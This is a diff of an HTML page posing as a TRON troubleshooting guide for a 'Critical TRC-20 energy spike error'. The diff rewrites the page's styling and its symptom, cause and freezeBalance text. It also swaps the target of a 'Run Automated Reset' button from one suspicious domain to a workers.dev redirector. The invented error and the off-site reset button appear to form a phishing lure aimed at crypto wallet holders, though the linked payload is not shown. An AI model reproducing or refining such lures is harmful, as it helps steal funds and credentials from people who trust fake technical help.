@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #121214;
+        font-family: sans-serif;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption on the TRON network, specifically related to TRC-20 token transactions.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption for TRC-20 token transactions on the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to an unexpected surge in the energy required to process TRC-20 transactions, which can be caused by various factors such as network congestion, inefficient smart contract code, or malicious activities.</li>
+<li>The error occurs due to an unexpected surge in energy demand, often caused by a large number of transactions being processed simultaneously, exceeding the available energy capacity of the user's account.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To troubleshoot and potentially resolve the issue, the following steps can be taken:</li>
-<li>Verify the current network conditions and wait for congestion to clear</li>
-<li>Optimize smart contract code to reduce energy consumption</li>
-<li>Adjust transaction parameters, such as gas limits, using the following command:</li>
+<li>Increase the account's energy capacity by freezing additional TRX tokens.</li>
+<li>Adjust the transaction parameters to reduce energy consumption, such as decreasing the transaction size or using a more energy-efficient smart contract.</li>
+<li>Use the following command to update the account's energy settings:</li>
 </ul>
-<pre class="codehilite"><code class="language-bash">tronweb.transactionBuilder.freezeBalance(1000, 3, &quot;TRX&quot;)
-</code></pre>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>tronweb.toSun<span class="o">(</span><span class="m">100</span><span class="o">)</span>,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="s1">&#39;0x...&#39;</span><span class="w"> </span><span class="o">)</span><span class="p">;</span>
+</code></pre></div>
 
-<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities. </p>
+<p>Consider using an external console for more advanced debugging and troubleshooting capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with TRON network architecture</li>
-<li>Understanding of TRC-20 token protocol</li>
-<li>Access to TRONWeb or similar development tools</li>
+<li>A basic understanding of TRON's energy system and transaction mechanics</li>
+<li>Access to the TRONWeb API and a compatible wallet</li>
+<li>Sufficient TRX tokens to cover energy costs and potential freezing requirements</li>
 </ul>
-<div style="text-align:center; margin-top:2rem;">
-<a href="https://tron.amana-vault.site" class="btn">🛠 Run Automated Reset</a>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=dHJvbg==" class="btn">🛠 Run Automated Reset</a>
 </div>
 </div>
 </body>
